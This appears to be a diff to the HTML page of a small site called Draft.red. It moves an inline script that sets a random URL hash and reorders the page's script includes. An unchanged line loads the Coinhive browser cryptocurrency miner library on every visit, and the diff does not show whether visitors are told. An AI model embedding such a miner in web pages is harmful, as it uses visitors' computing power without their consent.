@@ -5,6 +5,9 @@
     <title>Draft.red</title>
     <link rel="stylesheet" href="./style.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+    <script type="text/javascript">
+      if (window.location.hash == "") window.location.hash = "#"+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10);
+    </script>
   </head>
   <body>
     <div id="landing">
@@ -61,10 +64,7 @@
       </div>
     </div>
     <script src="https://cdn.rawgit.com/chancejs/chancejs/b1b61100/chance.js" charset="utf-8"></script>
-    <script src="./index.js" charset="utf-8"></script>
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <script type="text/javascript">
-      if (window.location.hash == "") window.location.hash = "#"+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10);
-    </script>
+    <script src="./index.js" charset="utf-8"></script>
   </body>
 </html>
